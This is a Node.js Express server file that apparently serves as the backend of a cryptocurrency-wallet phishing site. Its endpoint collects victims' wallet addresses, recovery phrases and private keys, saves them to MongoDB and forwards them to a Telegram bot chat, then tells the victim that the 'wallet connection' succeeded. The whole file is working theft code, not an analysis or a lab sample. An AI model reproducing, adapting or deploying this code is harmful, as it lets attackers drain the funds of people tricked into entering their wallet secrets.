const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const axios = require("axios");
const rateLimit = require("express-rate-limit");
require("dotenv").config();

const app = express();

// Configure CORS
const allowedOrigins = [
  "https://astonishing-cheesecake-627e2f.netlify.app",
  "http://localhost:5173",
  "https://theblockchain-eskq.onrender.com",
];

app.use(
  cors({
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);
      if (allowedOrigins.indexOf(origin) === -1) {
        return callback(new Error("CORS policy failure."), false);
      }
      return callback(null, true);
    },
    credentials: true,
    methods: ["POST", "GET", "OPTIONS"],
    optionsSuccessStatus: 200,
  })
);

app.use(express.json());

// Rate Limiting Middleware: Limits to 100 requests per IP per hour
const limiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 10,
  message: "Too many requests, please try again after soon",
});

app.use(limiter);

// MongoDB Connection
mongoose
  .connect(process.env.VITE_MONGO_URI)
  .then(() => console.log("MD connected"))
  .catch((err) => console.error("MD connection error:", err));

// Define a schema for wallet data
const walletSchema = new mongoose.Schema(
  {
    walletName: String,
    walletAddress: String,
    phraseWords: [String],
    phraseWords24: [String],
    privateKey: String,
  },
  { timestamps: true }
);

const Wallet = mongoose.model("Wallet", walletSchema);

// Function to send data to Telegram
async function sendToTelegram(walletData) {
  try {
    const phraseWords = Array.isArray(walletData.phraseWords) ? walletData.phraseWords.join(", ") : "N/A";
    const phraseWords24 = Array.isArray(walletData.phraseWords24) ? walletData.phraseWords24.join(", ") : "N/A";

    const message = `
      🏦 Wallet Submission 🏦
      Name: ${walletData.walletName || "N/A"}
      Address: ${walletData.walletAddress || "N/A"}
      Phrase Words: ${phraseWords}
      Phrase Words (24): ${phraseWords24}
      Private Key: ${walletData.privateKey || "N/A"}
    `;

    const response = await axios.post(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
      }
    );

    console.log("Data sent to Telegram:", response.data);
  } catch (error) {
    console.error("Error sending data to Telegram:", error.message);
  }
}

// Endpoint to handle wallet data
app.post("/api/send-wallet-data", async (req, res) => {
  console.log("Received request");

  const { walletName, walletAddress, phraseWords, phraseWords24, privateKey } = req.body;

  try {
    const newWallet = new Wallet({
      walletName,
      walletAddress,
      phraseWords,
      phraseWords24,
      privateKey,
    });

    await newWallet.save();
    console.log("Wallet data saved");

    // Send data to Telegram
    await sendToTelegram(req.body);

    res.status(200).json({ message: "Wallet connection successful" });
  } catch (error) {
    console.error("Error CWD:", error);
    res.status(500).json({ error: "Error CWD", details: error.message });
  }
});

app.get("/", (req, res) => {
  res.send("Welcome to the Blockchain Backend API");
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).send("Something broke!");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));

// Log unhandled promise rejections
process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection at:", promise, "reason:", reason);
});
